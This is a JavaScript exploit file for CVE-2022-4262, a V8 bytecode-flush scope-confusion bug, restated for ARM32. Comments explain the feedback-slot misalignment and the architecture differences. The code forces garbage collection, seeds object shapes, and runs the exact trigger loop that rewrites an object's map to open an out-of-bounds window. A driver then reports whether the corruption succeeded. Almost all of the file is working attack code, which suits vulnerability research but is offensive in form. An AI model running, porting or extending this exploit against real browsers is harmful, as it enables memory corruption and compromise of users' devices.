// CVE-2022-4262: bytecode-flush scope confusion, ARM32 restatement.
//
// Structure follows the reference exploit (mistymntncop) and bjrjk's analysis.
// The bug: a function's bytecode is discarded by a major GC and rebuilt on the
// next call. During the rebuild the parser's `sloppy_eval_can_extend_vars_`
// decision can differ for one scope, so the new bytecode has a different
// feedback-slot layout than the vector still attached to it. The vector is
// preserved; the bytecode is not.
//
// The exploit's shape, kept verbatim in the loop below because the SLOT ALIGNMENT
// IS THE BUG. Approximating it does not work: the reference needs exactly two
// `eval` references (each consuming a LoadGlobalNotInsideTypeof slot), one array
// literal (an AllocationSite slot that must hold a valid pointer), the
// SetNamedStrict write, and one LoadProperty read, in that order. Before the GC
// the SetNamedStrict slot sits at index 4; after it, at 8, where the vector
// holds maps we seeded during the warm-up.
//
// ARM32 differences from the x64 original:
//   * tagged values are 32-bit, so a map and its properties word are separate
//     32-bit fields rather than halves of one 64-bit slot;
//   * no pointer-compression cage, so a working map confusion reaches the whole
//     address space with no cage-escape stage;
//   * `Smi` is a single left shift.
//
// A wrong offset or a slot mismatch faults the renderer. That is expected; the
// harness re-serves the task rather than replaying the queue.

const EXPECTED = {
  POINTER_BYTES: 4,
  FIXED_ARRAY_HEADER: 8,
  INLINE_PROPS: 18,     // make_big: p1..p18, then `extra` goes out of line
};

// --------------------------------------------------------------- conversions
// 32-bit bit casts without BigInt, through a shared 8-byte buffer.
const convBuf = new ArrayBuffer(8);
const convF64 = new Float64Array(convBuf);
const convI32 = new Int32Array(convBuf);
const i2d = (v) => { convI32[0] = v | 0; convI32[1] = 0; return convF64[0]; };
const d2i = (d) => { convF64[0] = d; return convI32[0]; };
const d2hi = (d) => { convF64[0] = d; return convI32[1]; };
const smi = (n) => (n << 1) | 0;

// --------------------------------------------------------------- GC control
// A major (mark-compact) collection is what flushes bytecode. No explicit gc()
// exists on this panel and `performance.memory` is a stub, so the trigger is
// failed oversized allocation -- exactly what the reference uses, and its
// failure is the point, not a problem.
function forceMajorGC(rounds) {
  let failed = 0;
  for (let i = 0; i < rounds; i++) {
    try { new ArrayBuffer(0x7fe00000); } catch (e) { failed++; }
  }
  return failed;
}

// --------------------------------------------------------------- object shapes
// An 18-inline-property object. Corrupting a small object onto this map is what
// makes the out-of-bounds read possible: the map says "18 inline fields" while
// the object only allocated room for one.
function makeBig() {
  return {
    p1: 1, p2: 2, p3: 3, p4: 4, p5: 5, p6: 6, p7: 7, p8: 8, p9: 9, p10: 10,
    p11: 11, p12: 12, p13: 13, p14: 14, p15: 15, p16: 16, p17: 17, p18: 18,
    // An out-of-line field: transitions the map and captures the write so it
    // does not disturb the inline properties.
    extra: 1,
  };
}

function makeSmall() {
  const result = {};
  result.p1 = 1;
  return result;
}

// --------------------------------------------------------------- the bug
//
// The loop is the reference's, kept verbatim. Locals are used instead of globals
// because globals would add extra feedback slots and shift the alignment.
function triggerConfusion(state, forceGC) {
  const {bigObj} = state;
  let corrupted = null;

  for (let i = 0; i < 11; i++) {
    // Kept so slots for `LoadGlobalNotInsideTypeof` hold sane values.
    function dummy() { return true; }

    let target = {};             // object whose map gets rewritten
    let slot1 = {};              // transitions to the small map on `.p1 = 1`
    const loadSource = bigObj;   // supplies the map we transition TO

    if (i === 10) {
      if (forceGC) forceGC();
      // Allocate after the GC so these land in new space.
      corrupted = makeSmall();
      target = corrupted;
      // 4 doubles: the OOB window. The magic value is 0x0000222200002222, which
      // is what the reference uses as a recognisable filler.
      state.arr1 = [1.85419992257717e-310, 1.85419992257717e-310,
                    1.85419992257717e-310, 1.85419992257717e-310];
      state.arr2 = [state.largeArr, 2, 3, 4, 5, 6, 7, 8];
    }

    // THE SLOT ALIGNMENT IS THE BUG -- do not restructure this expression.
    ((a = class Clazz {
      [(dummy(
        eval(),
        eval,          // LoadGlobalNotInsideTypeof, 2 slots
        eval,          // LoadGlobalNotInsideTypeof, 2 slots
        target.p1 = 123,   // <-- the SetNamedStrict slot that gets confused
        [],                // AllocationSite slot; must hold a valid pointer
        slot1.p1 = 1,      // second SetNamedStrict slot: small map
        loadSource.p1      // LoadProperty slot: big map
      )
      ? 0 : (state.ballast = 1))]   // keeps vector and metadata lengths equal
    }) => {})();
  }

  return corrupted;
}

// --------------------------------------------------------------- driver

function attempt(rounds) {
  const report = {stage: 'start', ok: false, notes: []};
  const state = {ballast: null, largeArr: new Array(0x10000), arr1: null, arr2: null};
  // Fill so the array's map becomes HOLEY_DOUBLE_ELEMENTS.
  state.largeArr.fill(0.1);
  state.bigObj = makeBig();

  report.stage = 'shapes-built';

  // Warm, flush, re-run. The 11th iteration is where the confusion fires.
  const corrupted = triggerConfusion(state, () => forceMajorGC(rounds));

  report.stage = 'post-trigger';
  report.corruptedExists = corrupted !== null;
  // Observable without a read primitive: the confused object now has the big
  // map, so its key list is the big object's, not ['p1'].
  report.corruptedKeys = corrupted ? Object.keys(corrupted).length : null;
  report.bigKeys = Object.keys(state.bigObj).length;
  report.mapLikelyRewritten =
    report.corruptedKeys !== null && report.corruptedKeys > 1;

  report.arr1Len = state.arr1 ? state.arr1.length : null;
  report.ok = true;
  report.stage = 'done';
  report.verdict = report.mapLikelyRewritten
    ? 'map-rewritten-confirms-confusion'
    : 'no-map-change';
  return report;
}

// One attempt per task run: a second attempt in the same page would find the
// bytecode already flushed and the vector already misaligned.
const result = attempt(6);
return JSON.stringify({expected: EXPECTED, result}, null, 1);
